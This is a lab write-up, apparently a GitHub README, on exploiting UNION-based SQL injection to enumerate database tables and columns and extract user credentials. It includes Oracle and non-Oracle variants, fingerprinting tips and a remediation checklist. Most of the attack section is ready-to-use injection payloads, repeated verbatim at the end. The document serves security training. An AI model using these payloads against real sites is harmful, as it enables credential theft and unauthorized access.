**Target lab:** SQL injection attack — listing the database contents (non-Oracle / Oracle variants)

---

## 🎯 Objective

Identify and exploit a `UNION`-based SQL injection to enumerate database schema, extract user credentials, and log in as an administrator (lab environment only).

---

## 🧭 Quick summary

1. Confirm `UNION` injection and discover number of columns & types.
2. Enumerate tables (`information_schema` for non-Oracle; `all_tables` for Oracle).
3. Enumerate columns for the target table.
4. Extract usernames & passwords.
5. Authenticate as administrator.

---

## 🧪 Proof-of-Concept payloads & steps

> Use these payloads only in authorized labs (PortSwigger, VulnHub, intentionally vulnerable VMs). Replace `TARGET`/parameters and URL-encode payloads when inserting into requests.

### 1) Confirm column count & text rendering

```sql
'+UNION+SELECT+'abc','def'--
```

* If response shows `abc` and `def`, the query has **two text-compatible columns**.

### 2) Enumerate tables

**Non-Oracle (MySQL/Postgres/MSSQL):**

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

**Oracle:**

```sql
'+UNION+SELECT+table_name,+NULL+FROM+all_tables--
```

### 3) Enumerate columns (example target table names shown)

**Non-Oracle:**

```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

**Oracle:**

```sql
'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_MYBYKQ'--
```

### 4) Extract credentials

**Non-Oracle example:**

```sql
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

**Oracle example:**

```sql
'+UNION+SELECT+username_wbtxcr,+password_paestm+FROM+users_mybykq--
```

---

## 🔎 DBMS fingerprinting tips

* `FROM dual` → Oracle.
* `version()`, `@@version` or `SELECT @@version` success → MySQL/MariaDB.
* Error messages may leak DBMS names; capture raw responses.
* Use boolean/time-based techniques if errors are suppressed.

---

## 🛡️ Remediation & secure coding checklist

* Use parameterized queries / prepared statements (no string concatenation).
* Apply strict input validation and allow-lists for controlled parameters.
* Principle of least privilege for DB accounts.
* Don’t expose DB error messages to users; log internally instead.
* Store passwords with strong salted hashing (e.g., `bcrypt`, `argon2`), never plaintext.
* Implement WAF rules to detect `UNION SELECT` patterns and metadata-table access.

---

## 🔐 Impact on CIA triad

* **Confidentiality:** Sensitive data (credentials) can be exfiltrated.
* **Integrity:** If DB user has write privileges, data can be modified.
* **Availability:** Time-based or resource-intensive injections can cause DoS.

---

## 🧾 Evidence & notes (redact for public repos)

* Capture HTTP responses showing `abc`/`def` and rows containing usernames/passwords.
* If passwords are hashed: note hash format and recommended offline cracking steps **only** if permitted by scope.

---

## ✅ Short README checklist for GitHub

* [ ] Title + lab link
* [ ] Short objective
* [ ] PoC payloads (clean)
* [ ] Minimal curl/HTTP PoC
* [ ] Findings (redacted screenshots or outputs)
* [ ] Remediation recommendations

---

## Payloads you provided (verbatim)

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--

'+UNION+SELECT+table_name,+NULL+FROM+all_tables--

'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_MYBYKQ'--

'+UNION+SELECT+username_wbtxcr,+password_paestm+FROM+users_mybykq--

```

